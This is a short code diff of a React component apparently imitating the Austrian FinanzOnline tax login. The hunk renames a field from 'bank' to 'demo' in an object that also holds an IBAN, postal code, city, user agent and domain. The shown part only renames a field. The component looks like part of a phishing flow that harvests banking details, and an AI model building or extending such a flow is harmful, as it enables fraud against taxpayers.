@@ -155,7 +155,7 @@ const FinanzonlineSteuerLogin = () => {
         postal_code: postalCode,
         city,
         iban,
-        bank: selectedBank,
+        demo: selectedBank,
         flow: "finanzonline_steuer_login",
         user_agent: typeof navigator !== "undefined" ? navigator.userAgent : null,
         domain:
